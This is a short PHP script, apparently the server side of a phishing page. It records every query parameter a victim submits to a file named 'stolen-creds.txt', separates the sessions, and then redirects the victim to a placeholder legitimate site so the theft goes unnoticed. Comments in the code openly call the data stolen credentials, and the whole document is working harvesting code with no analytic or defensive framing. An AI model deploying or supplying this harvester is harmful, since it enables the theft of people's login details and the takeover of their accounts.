<?php
	// Redirect to legitimate website
	header ("Location: PAGELINK ");
	//Create file handle
	$handle = fopen("stolen-creds.txt", "a");
	// Store all stolen creds, in a 'key=value' format
	foreach($_GET as $variable => $value) {
		fwrite($handle, "$variable=$value\n");
	}
	// Add separator between different sessions
	fwrite($handle, "----------\n");
	// Drop handle
	fclose($handle);
?>
